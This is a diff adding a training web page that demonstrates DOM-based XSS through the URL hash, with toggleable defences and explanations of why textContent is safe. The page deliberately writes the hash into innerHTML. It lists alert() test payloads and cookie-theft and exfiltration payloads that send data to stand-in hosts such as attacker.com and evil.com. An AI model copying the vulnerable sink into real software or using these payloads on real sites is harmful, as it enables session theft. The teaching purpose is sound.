@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DOM-Based XSS Demo</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <div class="container">
+    <a href="/" class="home-button">🏠 Home</a>
+    <h1>DOM-Based XSS Demo</h1>
+    
+    <div class="info-box">
+      <h3>About DOM-Based XSS</h3>
+      <p>DOM-Based XSS occurs when client-side JavaScript processes user input and dynamically updates the DOM in an unsafe way. The server never sees the malicious payload - it's all handled in the browser.</p>
+      <p><strong>Attack Vector:</strong> Hash fragment in URL (e.g., #payload)</p>
+    </div>
+
+    <div class="vulnerable-code-box">
+      <h3>⚠️ Vulnerable Code Pattern</h3>
+      <p>This is the dangerous code that makes this page vulnerable to DOM-based XSS:</p>
+      <pre><code><span class="code-comment">// Read untrusted data from URL hash fragment</span>
+<span class="code-keyword">let</span> <span class="code-variable">hash</span> = <span class="code-function">decodeURIComponent</span>(<span class="code-variable">window</span>.<span class="code-variable">location</span>.<span class="code-variable">hash</span>.<span class="code-function">slice</span>(<span class="code-string">1</span>));
+
+<span class="code-keyword">const</span> <span class="code-variable">outputDiv</span> = <span class="code-variable">document</span>.<span class="code-function">getElementById</span>(<span class="code-string">'output'</span>);
+
+<span class="code-comment">// ❌ DANGEROUS! Directly inserting user input into the DOM</span>
+<span class="code-variable">outputDiv</span>.<span class="code-danger">innerHTML</span> = <span class="code-variable">hash</span>;  <span class="code-comment">// &lt;-- Vulnerable line!</span></code></pre>
+      <p><strong>Why it's dangerous:</strong> The <code>innerHTML</code> property parses and renders HTML, including event handlers. An attacker can inject malicious HTML like <code>&lt;img src=x onerror=alert(1)&gt;</code> which executes JavaScript.</p>
+      <p><strong>Safe alternative:</strong> Use <code>textContent</code> instead (this is what "Output Encoding" does):</p>
+      <pre><code><span class="code-comment">// ✅ SAFE: Treats input as plain text, no HTML parsing</span>
+<span class="code-variable">outputDiv</span>.<span class="code-function">textContent</span> = <span class="code-variable">hash</span>;  <span class="code-comment">// &lt;-- Safe!</span></code></pre>
+    </div>
+
+    <fieldset>
+      <legend>Security Controls Configuration</legend>
+      
+      <div class="control-group">
+        <label>
+          <input type="checkbox" id="clientValidation">
+          Client-Side Validation
+        </label>
+        <label>
+          <input type="checkbox" id="outputEncoding">
+          Output Encoding
+        </label>
+        <label>
+          <input type="checkbox" id="sanitization">
+          DOMPurify Sanitization
+        </label>
+        <label>
+          <input type="checkbox" id="cookieFlags">
+          Secure Cookie Flags
+        </label>
+      </div>
+
+      <div class="control-group">
+        <label for="csp">Content Security Policy:</label>
+        <select id="csp">
+          <optgroup label="Script Execution Controls">
+            <option value="none">None</option>
+            <option value="strict">Strict (self only)</option>
+            <option value="unsafe-inline">Allow unsafe-inline</option>
+            <option value="nonce">Nonce-based</option>
+          </optgroup>
+          <optgroup label="Post-Exploitation Prevention">
+            <option value="block-exfiltration">Block Data Exfiltration</option>
+            <option value="allow-self-only">Allow Self-Origin Only</option>
+            <option value="block-requests">Block All Requests</option>
+            <option value="block-forms">Block Form Submissions</option>
+          </optgroup>
+        </select>
+      </div>
+
+      <button type="button" onclick="applySecurityControls()" class="apply-controls-btn">🔄 Apply Security Controls</button>
+    </fieldset>
+
+    <form id="payloadForm" onsubmit="return false;">
+      <fieldset>
+        <legend>User Input (via Hash Fragment)</legend>
+        <input type="text" id="userInput" placeholder="Enter text or try a payload...">
+        <button type="button" onclick="updateHash()">Submit Payload</button>
+        <button type="button" onclick="clearOutput()">Clear</button>
+      </fieldset>
+    </form>
+
+    <div class="output-box">
+      <h3>Output Display:</h3>
+      <div id="output" class="output-content">
+        <p>Content will appear here based on the hash fragment...</p>
+      </div>
+    </div>
+
+    <div class="example-box">
+      <h3>Try These Payloads:</h3>
+      <p><strong>⚠️ Important:</strong> Script tags inserted via <code>innerHTML</code> don't execute (browser security). Use event handlers instead!</p>
+      <p><strong>Basic XSS (Event Handlers - These Work!):</strong></p>
+      <ul>
+        <li><code>&lt;img src=x onerror=alert('DOM-XSS')&gt;</code> ✅ Works!</li>
+        <li><code>&lt;svg/onload=alert(document.domain)&gt;</code> ✅ Works!</li>
+        <li><code>&lt;body onload=alert('XSS')&gt;</code> ✅ Works!</li>
+        <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;</code> ✅ Works!</li>
+      </ul>
+      <p><strong>Won't Work (innerHTML limitation):</strong></p>
+      <ul>
+        <li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ❌ Script tags don't execute via innerHTML</li>
+      </ul>
+      <p><strong>Post-Exploitation (Data Exfiltration):</strong></p>
+      <ul>
+        <li><code>&lt;img src=x onerror=fetch('https://attacker.com?cookie='+document.cookie)&gt;</code> - Cookie theft</li>
+        <li><code>&lt;img src=x onerror=new Image().src='https://evil.com?data='+btoa(document.body.innerHTML)&gt;</code> - Data exfiltration</li>
+        <li><code>&lt;img src=x onerror=navigator.sendBeacon('https://attacker.com',document.cookie)&gt;</code> - Beacon API</li>
+      </ul>
+      <p><strong>Try it:</strong> Click a payload above to copy it, paste into the input field, and click "Submit Payload"</p>
+    </div>
+
+    <div class="active-controls" id="activeControls">
+      <h3>Active Security Controls:</h3>
+      <ul>
+        <li>Client-Side Validation: <strong id="status-validation">❌ Disabled</strong></li>
+        <li>Output Encoding: <strong id="status-encoding">❌ Disabled</strong></li>
+        <li>DOMPurify Sanitization: <strong id="status-sanitization">❌ Disabled</strong></li>
+        <li>CSP: <strong id="status-csp">❌ Disabled</strong></li>
+        <li>Secure Cookies: <strong id="status-cookies">❌ Disabled</strong></li>
+      </ul>
+    </div>
+
+    <div class="info-box">
+      <h3>🔍 What's Happening?</h3>
+      <p>This page reads the hash fragment from the URL (everything after #) and displays it using <code>innerHTML</code>. When security controls are disabled, any HTML with event handlers in the hash is executed.</p>
+      <p><strong>Why don't &lt;script&gt; tags work?</strong> Browsers have a built-in security feature: script elements inserted via <code>innerHTML</code> don't execute. However, event handlers like <code>onerror</code>, <code>onload</code>, etc. still work, which is why DOM-based XSS attacks use these instead.</p>
+      <p>Watch the browser console for attempts blocked by CSP.</p>
+    </div>
+
+    <p><a href="/" class="back-link">← Back to Home</a></p>
+  </div>
+
+  <script>
+    function applySecurityControls() {
+      window.location.hash = '';
+      window.location.reload();
+    }
+
+    const cspMeta = document.createElement('meta');
+    cspMeta.httpEquiv = 'Content-Security-Policy';
+    
+    function updateStatusDisplay() {
+      const clientValidation = document.getElementById('clientValidation').checked;
+      const outputEncoding = document.getElementById('outputEncoding').checked;
+      const sanitization = document.getElementById('sanitization').checked;
+      const csp = document.getElementById('csp').value;
+      const cookieFlags = document.getElementById('cookieFlags').checked;
+      
+      document.getElementById('status-validation').innerHTML = clientValidation ? '✅ Enabled' : '❌ Disabled';
+      document.getElementById('status-encoding').innerHTML = outputEncoding ? '✅ Enabled' : '❌ Disabled';
+      document.getElementById('status-sanitization').innerHTML = sanitization ? '✅ Enabled' : '❌ Disabled';
+      document.getElementById('status-csp').innerHTML = csp !== 'none' ? '✅ ' + csp : '❌ Disabled';
+      document.getElementById('status-cookies').innerHTML = cookieFlags ? '✅ Enabled' : '❌ Disabled';
+      
+      if (csp !== 'none') {
+        let cspValue = '';
+        switch (csp) {
+          case 'strict':
+            cspValue = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';";
+            break;
+          case 'unsafe-inline':
+            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';";
+            break;
+          case 'nonce':
+            cspValue = "default-src 'self'; script-src 'nonce-random123'; style-src 'self' 'unsafe-inline';";
+            break;
+          case 'block-exfiltration':
+            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'none'; form-action 'none'; base-uri 'self';";
+            break;
+          case 'allow-self-only':
+            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'; base-uri 'self';";
+            break;
+          case 'block-requests':
+            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'none'; img-src 'self' data:;";
+            break;
+          case 'block-forms':
+            cspValue = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; form-action 'none'; base-uri 'none';";
+            break;
+        }
+        cspMeta.content = cspValue;
+        if (!document.querySelector('meta[http-equiv="Content-Security-Policy"]')) {
+          document.head.appendChild(cspMeta);
+        }
+      } else {
+        const existingMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+        if (existingMeta) {
+          existingMeta.remove();
+        }
+      }
+      
+      if (cookieFlags) {
+        document.cookie = "demo-session=dom-789; path=/; SameSite=Strict";
+      } else {
+        document.cookie = "demo-session=dom-789; path=/";
+      }
+    }
+
+    function htmlEncode(str) {
+      const div = document.createElement('div');
+      div.textContent = str;
+      return div.innerHTML;
+    }
+
+    function validateInput(input) {
+      const dangerous = /<|>/.test(input);
+      return !dangerous;
+    }
+
+    const userInputField = document.getElementById('userInput');
+    const userInputFieldset = userInputField.closest('fieldset');
+    let domErrorMessage = null;
+
+    function showDOMValidationError(message) {
+      userInputField.classList.add('validation-error');
+      userInputFieldset.classList.add('validation-error');
+      
+      if (!domErrorMessage) {
+        domErrorMessage = document.createElement('div');
+        domErrorMessage.className = 'error-message';
+        userInputFieldset.insertBefore(domErrorMessage, userInputField.nextSibling);
+      }
+      domErrorMessage.textContent = message;
+      
+      setTimeout(() => {
+        userInputField.classList.remove('validation-error');
+        userInputFieldset.classList.remove('validation-error');
+      }, 3000);
+    }
+
+    function clearDOMValidationError() {
+      userInputField.classList.remove('validation-error');
+      userInputFieldset.classList.remove('validation-error');
+      if (domErrorMessage) {
+        domErrorMessage.remove();
+        domErrorMessage = null;
+      }
+    }
+
+    userInputField.addEventListener('input', function(e) {
+      if (document.getElementById('clientValidation').checked) {
+        const input = e.target.value;
+        const dangerous = /<|>/.test(input);
+        
+        if (!dangerous) {
+          clearDOMValidationError();
+        }
+      } else {
+        clearDOMValidationError();
+      }
+    });
+
+    function updateHash() {
+      const input = document.getElementById('userInput').value;
+      
+      if (document.getElementById('clientValidation').checked) {
+        if (!validateInput(input)) {
+          showDOMValidationError('Client-Side Validation: Input contains dangerous characters (< or >)');
+          return;
+        }
+      }
+      
+      window.location.hash = encodeURIComponent(input);
+      location.reload();
+    }
+
+    function processHash() {
+      updateStatusDisplay();
+      
+      let hash = decodeURIComponent(window.location.hash.slice(1));
+      
+      if (!hash) {
+        return;
+      }
+      
+      const outputDiv = document.getElementById('output');
+      
+      if (document.getElementById('outputEncoding').checked) {
+        outputDiv.textContent = hash;
+      } else if (document.getElementById('sanitization').checked) {
+        outputDiv.innerHTML = '<p><em>Note: DOMPurify would sanitize this in a real implementation. For demo purposes, showing encoded: </em></p><p>' + htmlEncode(hash) + '</p>';
+      } else {
+        outputDiv.innerHTML = hash;
+      }
+    }
+
+    function clearOutput() {
+      window.location.hash = '';
+      document.getElementById('output').innerHTML = '<p>Content will appear here based on the hash fragment...</p>';
+      document.getElementById('userInput').value = '';
+    }
+
+    document.getElementById('clientValidation').addEventListener('change', function() {
+      updateStatusDisplay();
+      if (!this.checked) {
+        clearDOMValidationError();
+      }
+    });
+    document.getElementById('outputEncoding').addEventListener('change', function() {
+      updateStatusDisplay();
+      if (window.location.hash) {
+        processHash();
+      }
+    });
+    document.getElementById('sanitization').addEventListener('change', function() {
+      updateStatusDisplay();
+      if (window.location.hash) {
+        processHash();
+      }
+    });
+    document.getElementById('csp').addEventListener('change', updateStatusDisplay);
+    document.getElementById('cookieFlags').addEventListener('change', updateStatusDisplay);
+
+    updateStatusDisplay();
+    
+    if (window.location.hash) {
+      processHash();
+    }
+
+    document.querySelectorAll('.example-box code').forEach(code => {
+      code.style.cursor = 'pointer';
+      code.addEventListener('click', function() {
+        document.getElementById('userInput').value = this.textContent;
+        alert('Payload copied to input field! Click "Update Hash & Display" to test it.');
+      });
+    });
+  </script>
+</body>
+</html>
+
